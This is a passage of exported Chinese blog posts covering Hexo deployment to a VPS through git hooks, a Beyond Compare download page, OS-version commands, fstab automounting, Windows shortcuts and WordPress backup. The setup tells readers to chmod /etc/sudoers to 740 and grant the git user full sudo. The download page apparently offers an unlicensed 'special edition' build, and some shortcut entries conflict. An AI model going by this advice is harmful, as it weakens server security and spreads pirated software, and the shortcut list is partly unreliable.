VPS自行购买，要兼顾搭梯子就买墙外的，要速度最好买墙内。如果你的域名有备案或者打算备案，建议买阿里云的云服务器。 Nginx配置网站目录 通用的Nginx配置方法，只是用了Nginx提供网站服务，所以记住个网站根目录，我的VPS上之前装过lnmp，直接略过。 Git设置 VPS上装Git自动同步文件到网站根目录，实现自动化部署。 安装git 以 CentOS 为例，其他操作系统请自行更换命令。 123yum install git-core#早期Git名称被占用，所以Git只能叫Git-core了，不过现在可以直接用Git名安装了yum install git git用户设置 装好后，创建个git用户(如果直接用root账户就不用建了) 1234useradd -m git # 创建 git 用户，也可以用 adduserpasswd git # 设置密码chmod 740 /etc/sudoers #将新建的用户添加sudo权限vi /etc/sudoers 在vi编辑中找到如下内容： 12## Allow root to run any commands anywhereroot ALL=(ALL) ALL 把刚才新建的用户下面同样格式添加一行就变成 123## Allow root to run any commands anywhereroot ALL=(ALL) ALLgit ALL=(ALL) ALL 搞定就可以切换到新用户生成ssh秘钥了 1234567su gitcd ~git config --global user.email &#x27;youremail@example.com&#x27;git config --global user.name &#x27;yourusername&#x27;ssh-keygen -t rsa -C &#x27;youremail@example.com&#x27;#一般默认就可以了，`.pub`是公钥，把私钥复制到本地ssh -Tv &#x27;vps上的git用户名@vps地址&#x27; -p &#x27;ssh端口&#x27; #测试ssh连接是否成功 秘钥本地生成后上传到服务器也行，生成方法是一样的，如果ssh登录一直出现需要密码，或者复制的密钥总是不对，那试试下面的方法，也推荐直接用命令拷贝 1ssh-copy-id -i ~/.ssh/id_rsa.pub &#x27;git@vps地址&#x27; -p &#x27;ssh端口&#x27; 将生成的公钥添加到GitHub里面，参考官方帮助文档 git自动部署脚本 将网站根目录赋予git用户，就是Nginx中设置的那个网站根目录，如Hexo 123cd /home/wwwrootmkdir hexochown git:git -R /home/wwwroot/hexo 创建git仓库 12cd ~ #这里直接放用户目录下git init --bare hexo.git #建立一个名字叫hexo.git的裸库 配置git hooks，新建并编辑刚刚初始化过的仓库里的hooks/post-receive 123su gitcd /home/git/hexo.git/hooksvi post-receive 输入如下内容 123456789#!/bin/bashunset GIT_DIRGIT_REPO=/home/git/hexo.git #git仓库TMP_GIT_CLONE=/tmp/hexoPUBLIC_WWW=/home/wwwroot/hexo #网站目录rm -rf $&#123;TMP_GIT_CLONE&#125;git clone $GIT_REPO $TMP_GIT_CLONErm -rf $&#123;PUBLIC_WWW&#125;/*cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125; 保存退出后赋予该脚本可执行权限就可以了 1chmod +x post-receive 更高级的用法可以自动提交百度熊掌号，刷新CDN等操作，可见：网站Git自动部署 写文档的电脑 一般是Windows操作系统，这里以Windows为例，其他操作系统就不罗列了，自己去看文档或者google一下。 Git客户端 可以安装Git Windows或者索性GitHub Desktop，完全可视化，简单。 安装完成后，登录自己的账户，配置Git根目录。 Node.js 从Node.js网站上下载安装包，一路默认下来就行，记得勾选自动配置Path，省得以后麻烦。 Hexo 安装好Node.js和Git，就可以使用npm命令安装Hexo了。 npm介绍可见:npm模块安装机制简介 启动Git Shell或者’CMD’等终端，切换到Git根目录，开始安装Hexo。 123456npm install hexo-cli -g #全局安装Hexo客户端#安装完成后，创建个myHexo目录，并初始化Hexo项目Hexo init myHexo#这个`myHexo`目录就是Hexo博客的工作目录了，以后启动Hexo命令都要先切到这个目录下cd myHexonpm install #这个命令会把需要的依赖环境都自动装上 Hexo从 3.0 开始把服务器独立成了个别模块，所以要本地调试的话，还需要安装 hexo-server 才能使用 1npm install hexo-server --save 安装完成后，输入 hexo server 或简写 hexo s 命令以启动服务器，默认网站会在 http://localhost:4000 下启动。也可以指定端口如 hexo s -p 80 ，这样浏览器里只需要输入 localhost 就能访问本地调试内容了。 在服务器启动期间，Hexo 会监视文件变动并自动更新，无须重启服务。 客户端初始化完成后，在myHexo目录下应该有一堆文件了，目录结构应该这个样子的: 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 更多说明详见Hexo官方文档 体验Hexo Hexo设置 安装喜欢的主题 转Hexo的一个原因也是喜欢&quot;maupassant&quot;这个主题，简洁大气，更多的自己去官网看。 首先，去Hexo官网选择自己喜欢的主题，进入Gitshell或cmd切到刚才初始化好的Hexo工作目录，然后把主题用Git克隆到本地 1git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant 克隆完成后修改Hexo配置文件_config.yml 1234# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: maupassant #自己用的主题叫什么就改成什么 装 maupassant 这个主题折腾了好久，本地测试的时候样式错乱，作者博客说渲染器不对，具体见下文遇到的问题。 如果要设置自己的网站在浏览器标签左侧的图标，在Hexo的 source 下放个 favicon.ico。 文件自动提交部署 主要是改 Hexo 的配置 _config.yml 和主题目录下的 _config.yml ，按自己的需求改，找官方文档或自行Google。 多仓库同步提交deploy配置 123456789101112# Deployment## Docs: https://hexo.io/docs/deployment.html##如果出于安全或其它原因考虑，你修改了 SSH 默认的端口，那么上面 repository 的配置要做如下修改：##repo: ssh://yourusername@server:&lt;yourport&gt;/~/hexo.git##示例deploy: type: git repo: github: https://github.com/GitHubusername/example.github.io.git #同步到GitHub vps: ssh://git@example.com:22231/~/hexo.git #同步到自己的VPS branch: master message: Hexo update 开始写作 更改文章页面模板 Hexo下的scaffolds目录里，默认存着几个md模板，按自己的需求改，也可以按自己的需求建新模板，参数字段去Hexo官方文档里看。 新建文章 用官方命令 Hexo new [layout] &lt;title&gt;（Hexo new 可以简写为hexo n）或者用任何编辑器新建.md文档都可以。 建好后用 Hexo g 生成静态页，用 Hexo d 则会自动发布到你配置的git仓库中去. Hexo常用命令: 12345hexo clean #清理已解析编译文件，有文件删除改名，发布后但前台没改变时使用此命令hexo n [layout] &lt;title&gt; #新建文章hexo g #重新解析生成htmlhexo d #发布到git或其他地方#如果_config.xml中配置的发布地址是GitHubpage或者coding page页面，那访问对应 的仓库地址就可以看到网站效果了 Hexo有个我觉得需要改进的地方就是每次都要把全部文章重新生成，不管需不需要更新，用自动发布的命令后也会造成所有的文章都重新提交一遍。 有文章了，启动Hexo server就可以本地预览效果，编译的静态文件上传网站根目录就可以使用了。 迁移WordPress文章 首先，安装 hexo-migrator-wordpress 插件。 1npm install hexo-migrator-wordpress --save 在 WordPress 仪表盘中导出数据“Tools” → “Export” → “WordPress”(详情参考WP支持页面)。 插件安装完成后，执行下列命令来迁移所有文章，source 可以是 WordPress 导出的文件路径或网址。 12hexo migrate WordPress &lt;source&gt;#上面的&lt;source&gt;就是导出的xml文件 其他平台迁移可以参考官方文档。 常见问题及其解决方案 Hexo启动失败 JS-YAML: bad indentation of a mapping entry at line … 导入WordPress文章后，启动Hexo server一堆错误，这事折腾了一个周末，按错误提示一个个去看，结果还是用人力排除法，在某篇文章里出现了某段代码，把代码重新按MarkDown格式写了一遍就好了。 可坑爹的是，报错信息里压根就没提到这里有问题… 样式错乱 maupassant主题装好后，测试出现样式错乱。这下面这俩命令反反复复，ss全局代理，换淘宝npm源都无济于事… 1234npm uninstall hexo-renderer-sassnpm uninstall hexo-renderer-jadenpm install hexo-renderer-jade --savenpm install hexo-renderer-sass --save 渲染器安装失败的可以先卸载再装试试，一般用npm install就会把需要的东西自动都装上 如果是因为被墙的问题，用下面的命令改成淘宝源或使用代理。 1234npm config set registry https://registry.npm.taobao.org --globalnpm config set disturl https://npm.taobao.org/dist --globalnpm info underscore#如果上面配置正确这个命令会有字符串response 做完以上，有些人问题已经解决，但有些问题依旧。最后的最后，翻到主题作者页的评论的n层，原来说要安装python，而且是 python2.7 !!!安装此环境一般可成功编译 node-sass 。 hexo-renderer-sass 这个插件看了下最后一次更新是2018年，估计作者都不维护了，建议 按此方法换个插件替代 最终解决。 订阅 安装订阅插件 1npm install hexo-generator-feed --save 关于页面 maupassant主题里有个关于导航菜单，默认点进去是不行的，需要自己新建个。 在Hexo的 source 目录新建个 about 文件夹，文件夹里按模板新建个 index.md，内容大致如下: 123456---title: 关于本站layout: pagecomments: false---这里写自己的关于介绍... 多说评论框 这个第三方评论已成历史，还能用的可以试下畅言 调试的时候用的 localhost 访问，而多说是绑定了对应的域名的，所以会出现多说评论框不显示，分享那一行也样式错乱列表显示出来。 再检查下你的多说设置，就是.duoshuo.com前面那个，别填错了就可以了。 免密码登录 明明已经同步好密钥了，但仍然需要输入密码认证，多半是密钥同步内容或权限有问题，本地电脑重新生成一把密钥，然后使用ssh-copy-id 命令上传，该命令会自动处理权限。 1ssh-copy-id -i ~/.ssh/id_rsa.pub &#x27;vps上的git用户名@vps地址&#x27; -p &#x27;ssh端口&#x27; 多仓库提交 配置方法见前文。 第一次提交的时候可能会遇到这样的错误提示 1234567[remote rejected] HEAD -&gt; master (branch is currently checked out)remote: error: refusing to update checked out branch: refs/heads/masterremote: error: By default， updating the current branch in a non-bare repositoryremote: error: is denied， because it will make the index and work tree inconsistent ...remote: error: To squelch this message and still keep the default behaviour， setremote: error: &#x27;receive.denyCurrentBranch&#x27; configuration variable to &#x27;refuse&#x27;. 错误里说的很明白了，vps上的git默认设置的问题，其实已经告知改receive.denyCurrentBranch了，不想去找配置就用下面这条命令解决 1git config --bool core.bare true Git和VPS自动同步部署 这个从git自动同步到网站根目录的问题一直没解决，手动执行shell可以，但提交后不会自动部署，不知道哪里的问题…找了很多资料都没说 之前操作的时候因为VPS已有用于网站的账户，就没有新建 git 用户，原来这里默认用户名需要是 git 才可以，否则会出现不会知道执行 githooks 功能，这真的是个坑，应该哪里有用户名设置的，有空再研究下git文档。 后记 好了，这就是我的第一篇用MarkDown格式写的Hexo文章，我觉着把整个过程整理完整了，有缺漏或谬误之处欢迎留言进行指正赐教。 参考文档 hexo docs 使用git搭建静态免费blog VPS配合Git搭建Hexo博客 通过 Git Hooks 自动部署 Hexo 到 VPS Hexo快速搭建静态博客并实现远程VPS自动部署 通过Hexo在GitHub搭站全记录 在VPS上搭建hexo博客，利用git更新","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Beyond Compare-文件比较工具","slug":"software-beyond-compare","date":"2016-10-16T15:50:04.000Z","updated":"2017-03-15T03:49:26.000Z","comments":true,"path":"software-beyond-compare.html","permalink":"https://sobaigu.com/software-beyond-compare.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小： 5.3 m 支持系统：Windows/Linux/OSX 官方主页：www.scootersoftware.com 软件介绍 Beyond Compare是一款好用的专业级文件及文件夹对比工具。使用该工具可以可视化和调整差异，合并修改，同步文件夹。程序内建了文件浏览器，方便您针对文件、文件夹、压缩包、FTP网 站之间的差异对比及资料同步。它能很方便的对比文件及文件夹不同之处，并把相差字节用颜色加以区分；支持多种规则对比；对比功能反应迅速，功能上几乎无懈可击，不可多得的必备工具，修修改改者必备利器！ Beyond Compare可能会弹出提示说授权过期了，网上免费授权也不好找。如果弹出提示&quot;this license key has been revoked&quot;，可以考虑下载老版本使用 如果bc版本无法关联右键，请见本站另外一篇文章：Beyond Compare添加到右键菜单 下载地址 每列提取码与链接对应，如为空表示直接点进去链接不需要提取码，无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 r81t","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"查看系统版本方法大全_Windows和Linux系统","slug":"check-os-ver","date":"2016-10-08T05:04:11.000Z","updated":"2016-12-26T07:12:00.000Z","comments":true,"path":"check-os-ver.html","permalink":"https://sobaigu.com/check-os-ver.html","excerpt":"","text":"Linux Linux有很多发行版本,但查看查看系统版本的方法大同小异. 查看发行版命令: 12cat /etc/issuecat /etc/redhat-release #小红帽及centos可用这个命令 所有的发行版都能通用的查看内核的命令: 1uname -a Windows Windows系统,在界面程序上可以看到大版本,如我的电脑上右键进入查看,也可以查看explorer.exe的版本等.要看到详细的系统子版本,可用以下命令或工具. 直接启动CMD程序,知道会将操作系统版本号在顶部显示. Microsoft Windows [版本 10.0.14393] © 2016 Microsoft Corporation。保留所有权利。 以下命令个个都行,显示的内容大同小异,各取所需自行去试. 123456789101112#cmd显示的系统版本号ver#关于Windows,窗口程序显示系统版本winver#cmd显示操作系统信息,包括安装的补丁systeminfo#系统信息概况程序msinfo32.exe#xp时代的DirectX诊断工具,其中也会显示操作系统信息DxDiag#系统激活管理器slmgr /dlv 也可以直接查看注册表如下位置: 123[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion]&quot;BuildLab&quot;=&quot;10240.th1.160802-1852&quot;&quot;BuildLabEx&quot;=10240.17071.amd64fre.th1.160802-1852","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Ubuntu下开机自动挂载Windows分区","slug":"ubuntu-auto-mount-windows-partition","date":"2016-10-02T15:49:11.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"ubuntu-auto-mount-windows-partition.html","permalink":"https://sobaigu.com/ubuntu-auto-mount-windows-partition.html","excerpt":"","text":"大家学习Linux相信都是一机双系统,一来是条件限制,没钱专门买机器学习,二来也是人没有下定决心的表现,因为咱都怕有些事情在Linux下做不了,或者有些搞不定,给自己留了条后路,但其实这样很不利于我们学习Linux. 古人云,置之死地而后生,这个还真是有道理的. 我们进Linux系统后可以通过图形及命令行mount我们需要访问的Windows分区,但为了稍微稳定我们进Linux的决心,也为了在Linux下文件存放稍微方便,我们可以让Linux自动挂载我们的Windows分区,就先当个假的Linux sir吧. 首先，得知道自己win下面的每个盘符在Linux下的硬盘信息和设备名称，比如我的机子装的是Ubuntu,其他版本命令也应该是一样的,在终端下查看如下： 123456789101112131415Ubuntu2009@Ubuntu2009-desktop:~$ sudo fdisk -lDisk /dev/sda: 82.0 GB, 81964302336 bytes255 heads, 63 sectors/track, 9964 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesDisk identifier: 0x5b405b40Device Boot Start End Blocks Id System/dev/sda1 * 1 2295 18434556 7 HPFS/NTFS/dev/sda2 2296 4845 20482875 7 HPFS/NTFS/dev/sda3 4846 6758 15366172+ c W95 FAT32 (LBA)/dev/sda4 6759 9964 25752195 f W95 Ext&#x27;d (LBA)/dev/sda5 6759 8582 14651248+ b W95 FAT32/dev/sda6 8583 8704 979933+ 82 Linux swap / Solaris/dev/sda7 8705 9964 10120918+ 83 Linux 为了让Ubuntu进系统自动挂载,我们需要修改系统文件 /etc/fstab,修改前建议将原文件进行备份. 1Ubuntu2009@Ubuntu2009-desktop:~$ sudo cp /etc/fstab /etc/fstab.bak 备份完成后我们就可以大胆地修改了. 1Ubuntu2009@Ubuntu2009-desktop:~$sudo gedit /etc/fstab 打开etc下fstab文件，手动编辑挂载内容,最终编辑完成里面的内容大致如下: 12345678910111213# /etc/fstab: static file system information.## -- This file has been automaticly generated by ntfs-config --## &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;proc /proc proc defaults 0 0# Entry for /dev/sda7 :UUID=f6612d23-bfb1-4b35-8620-47a488a1da1a / jfs errors=remount-ro 0 1/dev/sda6 none swap sw 0 0/dev/sda1 /media/winc ntfs auto,user,nls=utf8,umask=0 0 0/dev/sda2 /media/wind ntfs auto,user,nls=utf8,umask=0 0 0/dev/sda3 /media/wine vfat auto,user,utf8,umask=0 0 0 我们最主要是要看下面的3行，这个是要我们自己写的，这里前面的/dev/sda*就是我们前面说过的，就不再赘述，后面/meidia/ *是你要挂载的地方，但是前提是你必须有那个文件夹，比如我的这句： /dev/sda1 /media/winc/ ntfs default 0 0 是将我的c盘挂载到/media/winc下，在挂载前得先自己创建文件夹winc，这个在终端下使用如下命令创建: Ubuntu2009@Ubuntu2009-desktop:~$sudo mkdir /media/winc 大家可以根据自己的需要添加,比如不需要访问Windows的C盘,那就不要挂载了,也可以防止误操作,影响到Windows系统。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Windows这些快捷操作，简单学会，效率翻倍","slug":"hotkeys-in-win10","date":"2016-09-18T07:14:16.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"hotkeys-in-win10.html","permalink":"https://sobaigu.com/hotkeys-in-win10.html","excerpt":"","text":"Windows系统一直以来都颇受大家的欢迎，殊不知平常在键盘左下角的哪个win键还有那么大用处，快来记下这些快捷键，轻松实现效率翻倍 Windows 10 快捷 Win键+Tab：激活任务视图 Win键+A：激活操作中心 Win键+C：通过语音激活Cortana Win键+D：显示桌面 Win键+E：打开文件管理器 Win键+G：打开Xbox游戏录制工具栏，供用户录制游戏视频或截屏 Win键+H：激活Windows 10应用的分享功能 Win键+I：打开Windows 10设置 Win键+K：激活无线显示器连接或音频设备连接 Win键+L：锁定屏幕 Win键+P：投影屏幕 Win键+R：运行 Win键+S：激活Cortana Win键+X：打开高级用户功能 Win键+左/右/上/下：移动应用窗口 Win键+Ctrl+D：创建一个新的虚拟桌面 Win键+Ctrl+F4：关闭虚拟桌面 Win键+Ctrl+左/右：切换虚拟桌面 Win键+Shift+左/右：将应用从一个显示屏移至另一个显示屏 Win键+1/2/3：打开任务栏中固定的程序，1代表任务栏中第一个应用图标 贴靠窗口：Win + 左/右 》 Win + 上/下 》 窗口可以变为 1/4 大小放置在屏幕 4 个角落 Ctrl+Alt+Del 快速打开任务管理器 Alt+F4 关机快捷键 Win+Shift+数字键：打开位于任务栏指定位置程序的新实例 Win+Break：显示“系统属性”对话框 Win+Ctrl+F：搜索计算机（如果你在网络上） Win+M：最小化所有窗口 Win+Shift+M：在桌面恢复所有最小化窗口（不恢复开始屏幕应用） Win+R：打开“运行”对话框 Win+T：切换任务栏上的程序 Win+Alt+回车：打开Windows媒体中心 Win+U：打开轻松访问中心 Win+F1：打开Windows帮助和支持 Win+N：插件新笔记（OneNote） Win+S：打开屏幕截图工具 Win+Q：打开Lync Win+A：接受所有来电 Win+X：拒绝来电（在microsoft Lync中），如果Windows移动中心存在，该快捷键不起作用 Win+减号：缩小（放大镜） Win+加号：放大（放大镜） Win+Esc：关闭放大镜 Win+空格键：切换输入语言和键盘布局 Win+O：禁用屏幕翻转 Win+，：临时查看桌面 Win+V：切换系统通知信息 Win+Shift+V：反向切换系统通知信息 Win+回车：打开“讲述人” Win+Tab：循环切换应用 Win+Shift+Tab：反向循环切换应用 Win键 + 。 当您将应用程序向一侧对齐时，此热键会将拆分栏移动至右侧 Win键 + Shift + 。 当您将应用程序向一侧对齐时，此热键会将拆分栏移动至左侧 Ctrl + Win键 + F 搜索计算机（如果已连接到网络） Shift + Win键 + 数字 启动锁定到任务栏中的由该数字所表示位置处 Ctrl + Win键 + 数字 切换到锁定到任务 栏中的由该数字所表示位置处的程序的最后一个活动窗口 Alt + Win键 + 数字 打开锁定到任务栏中的由该数字所表示位置处的程序的跳转列表 （Jump List） Ctrl + Win键 + Tab 通过 Aero Flip 3-D 使用箭头键循环切换任务栏上的程序 Ctrl + Win键 + B 切换到在通知区域中显示消息的程序 Windows系统通用快捷键 F1 显示帮助 Ctrl+Shift+Esc 打开任务管理器 Ctrl+A 全选 Ctrl+C（或 Ctrl+Insert） 复制选择的项目 Ctrl+X 剪切选择的项目 Ctrl+V（或 Shift+Insert） 粘贴选择的项目 Ctrl+Z 撤消操作 Ctrl+Y 重新执行某项操作 Delete（或 Ctrl+D） 删除所选项目并将其移动到“回收站” Shift+Delete 不先将所选项目移动到“回收站”而直接将其删除 F2 重命名选定项目 Ctrl+向右键 将光标移动到下一个字词的起始处 Ctrl+向左键 将光标移动到上一个字词的起始处 Ctrl+向下键 将光标移动到下一个段落的起始处 Ctrl+向上键 将光标移动到上一个段落的起始处 Ctrl+Shift 加某个箭头键 选择一块文本 Shift 加任意箭头键 在窗口中或桌面上 选择多个项目，或者在文档中选择文本 Ctrl 加任意箭头键+空格键 选择窗口中或桌面上的多个单个项目 Ctrl+A 选择文档或窗口中的所有项目 F3 搜索文件或文件夹 Alt+Enter 显示所选项的属性 Alt+F4 关闭活动项目或者退出活动程序 Alt+空格键 为活动窗口打开快捷方式菜单 Ctrl+F4 关闭活动文档（在允许同时打开多个文档的程序中） Ctrl+Alt+Tab 使用箭头键在打开的项目之间切换 Ctrl+鼠标滚轮 更改桌面上的图标大小 Win键 + Tab 使用 Aero Flip 3-D 循环切换任务栏上的程序 Ctrl + Win键 + Tab 通过 Aero Flip 3-D 使用箭头键循环切换任务栏上的程序 Alt+Esc 以项目打开的顺序循环切换项目 F6 在窗口中或桌面上循环切换屏幕元素 F4 在 Win资源管理器中显示地址栏列表 Shift+F10 显示选定项目的快捷菜单 Ctrl+Esc 打开“开始”菜单 Alt+加下划线的字母 显示相应的菜单 Alt+加下划线的字母 执行菜单命令（或其他有下划线的命令） F10 激活活动程序中的菜单栏 向右键 打开右侧的下一个菜单或者打开子菜单 向左键 打开左侧的下一个菜单或者关闭子菜单 F5（或 Ctrl+R） 刷新活动窗口 Alt+向上键 在 Win资源管理器中查看上一级文件夹 Esc 取消当前任务 插入 CD 时按住 Shift 阻止 CD 自动播放 左 Alt+Shift 在启用多种输入语言时切换输入语言 Ctrl+Shift 在启用多个键盘布局时切换键盘布局 右或左 Ctrl+Shift 更改从右到左阅读语言的文本阅读方向 Win资源管理器中的快捷键 Ctrl+N 打开新窗口 Ctrl+W 关闭当前窗口 Ctrl+Shift+N 新建文件夹 End 显示活动窗口的底端 Home 显示活动窗口的顶端 F11 最大化或最小化活动窗口 Ctrl+句点 顺时针旋转图片 Ctrl+逗号 逆时针旋转图片 Num Lock+数字键盘上的星号 （*） 显示所选文件夹下的所有子文件夹 Num Lock+数字键盘上的加号 （+） 显示所选文件夹的内容 Num Lock+数字键盘上的减号 （-） 折叠选定的文件夹 向左键 折叠当前选项（如果它处于展开状态），或者选择其父文件夹 Alt+Enter 打开所选项目的“属性”对话框 Alt+P 显示预览窗格 Alt+向左键 查看上一个文件夹 Backspace （退格键） 向上，返回父文件夹 向右键 显示当前选项（如果它处于折叠状态），或者选择第一个子文件夹 Alt+向右键 查看下一个文件夹 Alt+向上键 查看父文件夹 Ctrl+Shift+E 显示所选文件夹上面的所有文件夹 Ctrl+鼠标滚轮 更改文件和文件夹图标的大小和外观 Alt+D 选择地址栏 Ctrl+E 选择搜索框 Ctrl+F 选择搜索框 在对话框中使用的快捷键 Ctrl+Tab 在选项卡上向前移动 Ctrl+Shift+Tab 在选项卡上向后移动 Tab 在选项上向前移动 Shift+Tab 在选项上向后移动 Alt+加下划线的字母 执行与该字母匹配的命令（或选择选项） Enter 对于许多选定命令代替单击鼠标 空格键 如果活动选项是复选框，则选中或清除该复选框 箭头键 如果活动选项是一组选项按钮，则选择某个按钮 F1 显示帮助 F4 显示活动列表中的项目 Backspace 如果在“另存为”或“打开”对话框中选中了某个文件夹，则打开上一级文件夹 任务栏 按住 Shift 并单击某个任务栏按钮 打开程序，或快速打开程序的另一个实例 按住 Ctrl+Shift 并单击某个任务栏按钮 以管理员身份打开程序 按住 Shift 并右键单击某个任务栏按钮 显示该程序的窗口菜单 按住 Shift 并右键单击某个分组的任务栏按钮 显示该组的窗口菜单 按住 Ctrl 并单击某个分组的任务栏按钮 循环切换该组的窗口","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"网站搬家,备份与还原","slug":"move-your-site","date":"2016-08-21T15:53:06.000Z","updated":"2024-09-28T00:17:21.259Z","comments":true,"path":"move-your-site.html","permalink":"https://sobaigu.com/move-your-site.html","excerpt":"搞网站或者玩自有博客的同学经常会遇到网站搬家的问题，有时候是因为空间不好，有时候是因为被迫搬家，如服务器ip被墙，或者空间商倒闭了.诸如此类问题有如家常便饭,所以我们要时刻有狡兔三窟的准备.","text":"搞网站或者玩自有博客的同学经常会遇到网站搬家的问题，有时候是因为空间不好，有时候是因为被迫搬家，如服务器ip被墙，或者空间商倒闭了.诸如此类问题有如家常便饭,所以我们要时刻有狡兔三窟的准备. 时刻准备备份你的网站资料 所谓网站数据,使用WordPress博客系统通常包含以下: wp-config.php：包含网站数据库主机用户密码等敏感信息 wp-content：此目录包含主题,插件,上传的附件等主要信息[重要] mysql数据库：保存网站设置,文章内容[重要] .htaccess：此文件设置固定链接后会写入相关设置,一般不需要备份 我们可以定期把以上文件在线压缩打包[空间商一般都提供此服务],备份到网盘或者邮箱或者用ftp软件下载到本地保存,推荐用flashFXP,介绍及下载见本站另外一篇文章:FlashFXP绿色注册版 有一款备份插件:wp Time Machine,可以点击超链接访问作者主页下载安装,也可以在WordPress搜索安装.此插件提供备份以上需要备份的文件的功能,备份的文件将发送到ftp或者dropbox.如果是自己管理的主机,还可以添加定时任务,达到自动备份的功能. 本人使用过程中,wp Time Machine只备份了wp-content目录到dropbox,其他文件日志中已经显示备份了,但并未把其他文件备份,不知道为何,有完整备份的同学还望告知一声如何处理. 备份方法 由于安装的插件未能把我的数据库也一起备份[据说有个DBbackup插件可以,暂未尝试],所以就自己备份相关数据库和其他未备份的文件,手动备份数据库方法有两种: 使用WordPress自带的导出功能备份 WordPress后台控制面板&gt;工具&gt;导出,选择你要导出的内容,一般选择所有,然后点击下载导出文件到本地就可以了.下载得到一个xml文件,里面就包含数据库中的所有文章内容,有兴趣可以打开一看究竟. 使用WordPress自带的导出工具备份网站文章是个比较方便的方法,但备份整个网站时,推荐使用phpmyadmin这类来备份数据库了. 备份数据库 登陆MySQL数据库后台,一般会提供一个在线管理,在线管理一般用的就是PHPmyadmin了.登陆后,选择导出,将把你选择的数据库完整导出到文件,如图2所示. 默认将导出sql格式,当然,我们也可以选择xml,包含的内容都是一样的,使用什么格式就看个人喜好.不过有个地方需要注意,因为我们用的网站空间时,空间商提供的数据库账号都是有权限限制的,所以选择数据库导出时,将导出创建数据库语句CREATE DATABASE 而我们的账号往往是已经创建好了数据库名,不具备creat权限,导入时用此数据库有可能会提示错误而无法导入,我们可以对导出的sql文件修改,将以下代码注释或者删除. 12`CREATE DATABASE `xxx` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;USE `xxx`;` 或者导出之前先点击自己的数据库,然后全选表,再点导出,此时导出的文件中将不包含创建数据库语句,其他内容一致. 至此,备份网站资料的工作已经全部完成. 还原备份 如果没有遗漏,我们已经备份了以下内容： wp-content目录 sql文件 wp-config.php .htaccess(一些服务器设置,对网站来说无关紧要) 还原文件 我们可以在本地把WordPress程序文件和我们备份的wp-content,``wp-config.php和.htaccess整合好,然后通过ftp上传,因为WordPress程序和我们备份的文件都比较小,上传时间可能会比较长.建议是本地压缩,然后上传,再通过空间商的在线解压释放文件,此方法可大大减少WordPress程序部署时间. 当然,恢复wp-config.php文件的前提是新的空间用户名和密码与原先老的空间相同的情况下,如果已经改变,此文件就不必备份了,到时候创建一份即可. 恢复数据 文件部署完成,我们再恢复mysql数据库. 针对之前两种备份方案,恢复数据库有两种途径: 通过WordPress的导入功能还原 WordPress日常备份文章是比较方便,但注意我前面说的是文章内容,你网站的一些插件,主题等设置不包括在内,所以用此备份还原网站时,需要先安装WordPress,安装完成后用WordPress导入功能导入之前用WordPress导出的xml文件.导入功能需要安装一个插件,点击导入后会自动列出可用的插件,点击WordPress 导入工具,然后选择之前通过WordPress导出的xml文件,点击上传并导入,接下来的事情就没什么好说的了,程序会自动帮你搞定.这里我们可以发现,WordPress导出的备份不关心数据库和密码,即可以用于任何空间使用,只要对应的wp-content目录备份好就可以了. 同时我们需要注意,此方法导入的文章和分类id号会发生改变,当然,此改变程序会自动完成关联,不会影响到文章访问,在还原前请将原先的文章清空(你不会不备份直接照做吧?(^o^)/~),然后再导入就不会有重复和多余了. 通过phpmyadmin导入脚本 此方法不依赖于WordPress程序是否安装完成,只需要登录到phpmyadmin,选择对应数据库,然后使用导入功能导入即可.导入完成后,访问网站前台即可看到效果,虽然方法看起来比较麻烦点,但备份信息全面准确,推荐此方法. 